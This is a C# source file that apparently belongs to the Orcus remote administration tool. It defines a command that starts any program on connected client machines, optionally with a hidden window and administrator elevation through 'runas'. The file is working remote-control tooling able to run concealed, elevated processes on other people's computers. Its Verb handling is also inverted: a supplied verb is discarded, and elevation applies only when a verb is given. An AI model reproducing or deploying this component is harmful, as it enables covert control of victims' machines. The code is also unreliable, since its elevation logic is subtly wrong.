using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using Orcus.Plugins;
using Orcus.Plugins.PropertyGrid;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Utilities;

namespace Orcus.StaticCommands.System
{
    public class ExecuteProcessCommand : StaticCommand
    {
        public ExecuteProcessCommand()
        {
            this.RegisterProperty(() => FileName, Resources.StaticCommands.FileName,
                    Resources.StaticCommands.System_ExecuteProcessCommand_FileName_Description,
                    Resources.StaticCommands.Common)
                .RegisterProperty(() => Arguments, Resources.StaticCommands.Arguments,
                    Resources.StaticCommands.System_ExecuteProcessCommand_Arguments_Description,
                    Resources.StaticCommands.Common)
                .RegisterProperty(() => WorkingDirectory,
                    Resources.StaticCommands.System_ExecuteProcessCommand_WorkingDirectory,
                    Resources.StaticCommands.System_ExecuteProcessCommand_WorkingDirectory_Description,
                    Resources.StaticCommands.Advanced)
                .RegisterProperty(() => UseShellExecute,
                    Resources.StaticCommands.System_ExecuteProcessCommand_ShellExecute,
                    Resources.StaticCommands.System_ExecuteProcessCommand_ShellExecute_Description,
                    Resources.StaticCommands.Advanced)
                .RegisterProperty(() => Verb, Resources.StaticCommands.System_ExecuteProcessCommand_Verb,
                    Resources.StaticCommands.System_ExecuteProcessCommand_Verb_Description,
                    Resources.StaticCommands.Advanced)
                .RegisterProperty(() => CreateNoWindow,
                    Resources.StaticCommands.System_ExecuteProcessCommand_CreateNoWindow,
                    Resources.StaticCommands.System_ExecuteProcessCommand_CreateNoWindow_Description,
                    Resources.StaticCommands.Visibility)
                .RegisterProperty(() => WindowStyle, Resources.StaticCommands.System_ExecuteProcessCommand_WindowStyle,
                    Resources.StaticCommands.System_ExecuteProcessCommand_WindowStyle_Description,
                    Resources.StaticCommands.Visibility)
                .RegisterProperty(() => ExecuteAsAdministrator,
                    Resources.StaticCommands.System_ExecuteProcessCommand_Administrator,
                    Resources.StaticCommands.System_ExecuteProcessCommand_Administrator_Description,
                    Resources.StaticCommands.Common);
        }

        public override Guid CommandId { get; } = new Guid(0x383e7e5e, 0x4d73, 0x8b45, 0xbb, 0x1b, 0xcc, 0xaa, 0xe9,
            0xae, 0x7b, 0x4f);

        public override string Name { get; } = Resources.StaticCommands.System_ExecuteProcessCommand_Name;
        public override string Description { get; } = Resources.StaticCommands.System_ExecuteProcessCommand_Description;
        public override StaticCommandCategory Category { get; } = StaticCommandCategory.System;

        public string FileName { get; set; }
        public string Arguments { get; set; }
        public bool CreateNoWindow { get; set; }
        public string WorkingDirectory { get; set; }
        public bool UseShellExecute { get; set; } = true;
        public WindowStyle WindowStyle { get; set; }
        public string Verb { get; set; }
        public bool ExecuteAsAdministrator { get; set; }

        public override InputValidationResult ValidateInput()
        {
            if (FileName.IsNullOrWhiteSpace())
                return InputValidationResult.Error(Resources.StaticCommands.PathCannotBeEmpty);

            try
            {
                new FileInfo(FileName);
            }
            catch (Exception)
            {
                return InputValidationResult.Error(Resources.StaticCommands.InvalidFilename);
            }

            if (!Verb.IsNullOrWhiteSpace() && !new ProcessStartInfo(FileName).Verbs.Contains(Verb))
                return
                    new InputValidationResult(
                        Resources.StaticCommands.System_ExecuteProcessCommand_ValidateInput_VerbDoesNotExist,
                        ValidationState.WarningYesNo);

            return InputValidationResult.Successful;
        }

        public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory,
            IClientInfo clientInfo)
        {
            commandParameter.InitializeProperties(this);
            var process = new Process
            {
                StartInfo =
                {
                    FileName = FileName,
                    Arguments = Arguments,
                    CreateNoWindow = CreateNoWindow,
                    WorkingDirectory = WorkingDirectory,
                    UseShellExecute = UseShellExecute,
                    WindowStyle = (ProcessWindowStyle) WindowStyle,
                    Verb = string.IsNullOrEmpty(Verb) ? Verb : (ExecuteAsAdministrator ? "runas" : null)
                }
            };

            if (!process.Start())
                feedbackFactory.Failed();
        }
    }

    public enum WindowStyle
    {
        /// <devdoc>
        ///     Show the window in a default location.
        /// </devdoc>
        Normal,

        /// <devdoc>
        ///    <para>[To be supplied.]</para>
        /// </devdoc>
        Hidden,

        /// <devdoc>
        ///     Show the window minimized.
        /// </devdoc>
        Minimized,

        /// <devdoc>
        ///     Show the window maximized.
        /// </devdoc>
        Maximized
    }
}